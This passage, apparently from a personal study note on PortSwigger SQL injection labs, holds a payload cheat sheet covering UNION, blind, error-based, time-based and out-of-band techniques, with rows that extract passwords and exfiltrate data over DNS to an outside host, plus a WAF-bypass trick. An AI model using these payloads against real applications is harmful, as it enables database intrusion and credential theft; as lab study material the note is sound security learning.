+> |Find text column|Any|`' UNION SELECT NULL,'a',NULL--`|8|No error = column 2 accepts strings|
+> |Version (MySQL/MSSQL)|MySQL/MSSQL|`' UNION SELECT @@version,NULL--`|4|Returns DB version string|
+> |Version (Oracle)|Oracle|`' UNION SELECT banner,NULL FROM v$version--`|3|Returns Oracle version|
+> |Version (PostgreSQL)|PG|`' UNION SELECT version(),NULL--`|(general)|Returns PG version|
+> |List tables (non-Oracle)|All but Oracle|`' UNION SELECT table_name,NULL FROM information_schema.tables--`|5, 9|Enumerates all tables in DB|
+> |List columns (non-Oracle)|All but Oracle|`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`|5, 9|Enumerates columns for a table|
+> |List tables (Oracle)|Oracle|`' UNION SELECT table_name,NULL FROM all_tables--`|6|Enumerates all tables (Oracle)|
+> |List columns (Oracle)|Oracle|`' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--`|6|Enumerates columns (Oracle)|
+> |Multi-value single column|Oracle, PG|`' UNION SELECT NULL,username\|'~'\|password FROM users--`|10|Concatenates values with separator|
+> |Multi-value single col (MSSQL)|MSSQL|`' UNION SELECT NULL,username+'~'+password FROM users--`|(general)|Same via `+` operator|
+> |Multi-value single col (MySQL)|MySQL|`' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--`|(general)|Same via `CONCAT()`|
+> |Boolean true|Any|`' AND '1'='1'--`|11|True condition — page shows normal content|
+> |Boolean false|Any|`' AND '1'='2'--`|11|False condition — page changes (or message disappears)|
+> |Boolean: check user exists|Any|`' AND (SELECT 'a' FROM users WHERE username='administrator')='a`|11|True if user exists|
+> |Boolean: get password length|Any|`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`|11|Tests one character position|
+> |Boolean: substring|Any|`SUBSTRING('foobar',4,2)`|11|Returns `'ba'` — extract substring from position 4, length 2|
+> |Conditional error (Oracle)|Oracle|`' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--`|12|True → divide-by-zero error|
+> |Conditional error (MSSQL)|MSSQL|`' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--`|(general)|True → divide-by-zero error|
+> |Visible error (CAST)|MSSQL, PG|`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`|13|Leaks password in error message|
+> |Time delay (PG)|PG|`'\|pg_sleep(10)--`|14, 15|Unconditional 10s delay|
+> |Time delay (MySQL)|MySQL|`' OR SLEEP(10)--`|(general)|Unconditional 10s delay|
+> |Time delay (MSSQL)|MSSQL|`' WAITFOR DELAY '0:0:10'--`|(general)|Unconditional 10s delay|
+> |Time delay (Oracle)|Oracle|`' OR dbms_pipe.receive_message(('a'),10)--`|(general)|Unconditional 10s delay|
+> |Conditional time (PG)|PG|`'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`|15|Delays only when condition is true|
+> |Conditional time (MySQL)|MySQL|`' IF((condition),SLEEP(10),'a')--`|(general)|Delays only when condition is true|
+> |Conditional time (MSSQL)|MSSQL|`' IF (condition) WAITFOR DELAY '0:0:10'--`|(general)|Delays only when condition is true|
+> |OOB DNS (Oracle XXE)|Oracle|`' UNION SELECT EXTRACTVALUE(xmltype('<?xml...ENTITY % remote SYSTEM "http://URL">%remote;]>'),'/l') FROM dual--`|16, 17|Triggers DNS to Collaborator|
+> |OOB exfil (Oracle)|Oracle|`' UNION SELECT EXTRACTVALUE(xmltype('<?xml...ENTITY % remote SYSTEM "http://'\|(SELECT password FROM users)\|'.URL">%remote;]>'),'/l') FROM dual--`|17|Exfiltrates data via DNS subdomain|
+> |OOB DNS (MSSQL)|MSSQL|`exec master..xp_dirtree '//URL/a'`|(general)|DNS lookup via SMB share|
+> |OOB DNS (PG)|PG|`copy (SELECT '') to program 'nslookup URL'`|(general)|DNS via `copy` to program|
+> |OOB DNS (MySQL Win)|MySQL|`LOAD_FILE('\\\\\\\\URL\\\\a')`|(general)|Windows-only UNC path lookup|
+> |WAF bypass (XML entities)|Any|`<@hex_entities>1 UNION SELECT ...</@hex_entities>`|18|Encodes SQL inside XML to bypass WAF|
+
+---
+
+## Common Pitfalls / Lessons Learned
+
+> [!warning] Mistakes from Labs
+> 
+> - **Wrong comment syntax** — MySQL uses `#` or `--` (with trailing space); Oracle/PG/MSSQL use `--`. Using `--` on MySQL without the trailing space doesn't work (Lab 4 → switched to `#`).
+> - **Oracle UNION without FROM DUAL** — Every UNION SELECT in Oracle must include `FROM DUAL`. Forget it → syntax error (Labs 3, 6).
+> - **Column count mismatch** — If UNION returns fewer columns than the original query, you get 0 results (not an error). If more columns, you get a real SQL error. Always probe with NULLs first (Lab 7).
+> - **Type mismatch in text column search** — Replacing NULL with a string literal in a numeric column causes a CAST error. Try each position individually (Lab 8).
+> - **Batched queries don't return results** — `; SELECT ...` executes the second query but its output is NOT appended to the first result set. Use UNION instead for in-band extraction.
+> - **MySQL + batched queries rarely works for injection** — Only possible with certain PHP/Python MySQL APIs. Not reliable (PortSwigger cheat sheet note).
+> - **Time-based: overlapping requests corrupt timing** — Concurrent Intruder requests queue at the server, making ALL responses slow. Set resource pool max concurrent = 1 (Lab 15 step 9d).
+> - **OOB: Oracle XXE requires unpatched installation** — Patched Oracle installations don't allow the XXE-based `EXTRACTVALUE` trick. Use `UTL_INADDR.get_host_address()` instead (requires extra privileges).
+> - **Blind: URL-encode semicolons and spaces** — In cookie/header injection, raw `;` is a cookie separator (not part of your payload). URL-encode as `%3b`. Raw spaces also cause issues — use `+` or `%20` (Lab 15).
+> - **Concurrent requests in boolean blind** — While not as critical as time-based, concurrent boolean requests can sometimes cause race conditions in the app. Use 1 concurrent for clean ordering.
+> - **WAF block vs SQL error** — A block page with no SQL error message means a WAF is rejecting your request (Lab 18). A true SQL error includes query syntax info. Don't waste time debugging SQL syntax if it's a WAF.
+
+---
+
+## Quick Reference — Technique Summary
+
+> [!NOTE] Quick Reference — Technique | When to Use | Key Indicator It Worked
+> 
+> |Technique|When to Use|Key Indicator|
+> |:--|:--|:--|
+> |**UNION-based**|Output displayed on page|Extra rows appear in response|
+> |**Error-based (CAST)**|Verbose SQL errors shown|Target data appears inside error message|
+> |**Boolean-based**|Page content changes between true/false, no data output|"Welcome back" (or similar) appears/disappears|
+> |**Conditional error**|Error page on true, no error on false, content otherwise identical|"Internal Server Error" vs 200 OK|
+> |**Time-based**|No visible difference at all; server processes queries|`pg_sleep(10)` → ~10s response|
+> |**OOB**|Injection confirmed but no in-band signal at all|DNS/HTTP interaction in Collaborator|
+> |**WAF bypass (XML entities)**|WAF blocks keyword patterns|Block page before encoding → 200 OK after encoding|
+
+---
+
+**Finished — Happy Hacking!**
+
+---
+
+**Find me online:**
+
+- TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)
+- HackTheBox: [t4t4r1s](https://app.hackthebox.com/users/2203575)
+- LinkedIn: [Mustafa Eltayeb](https://www.linkedin.com/in/t4t4r1s)
+- X: [@mustafa_altayeb](https://x.com/t4t4r1s)
+
+---
+
+> [!NOTE] Metadata **Connected To:** `SQLMap` · `SQL Injection Fundamentals` · `Burp Suite` · `Web Security Academy` **Tags:** #SQLi #SQLInjection #PortSwigger #UnionBased #BlindSQLi #ErrorBased #TimeBased #OOB #BooleanBlind #WAFBypass #BurpSuite #WebSecurity
